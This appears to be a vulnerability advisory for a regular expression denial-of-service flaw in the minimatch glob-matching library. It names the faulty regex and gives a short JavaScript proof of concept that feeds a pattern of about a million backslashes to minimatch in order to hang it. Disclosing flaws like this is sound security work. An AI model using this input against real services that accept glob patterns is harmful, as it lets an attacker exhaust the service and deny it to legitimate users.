title: Regular Expression Denial of Service
overview: Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\|/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `\\`.        A proof of concept is as follows:    ```    var minimatch = require(“minimatch”);        // utility function for generating long strings    var genstr = function (len, chr) {      var result = “”;      for (i=0; i<=len; i++) {        result = result + chr;      }      return result;    }        var exploit = “[!” + genstr(1000000, “\\”) + “A”;        // minimatch exploit.    console.log(“starting minimatch”);    minimatch(“foo”, exploit);    console.log(“finishing minimatch”);    ```
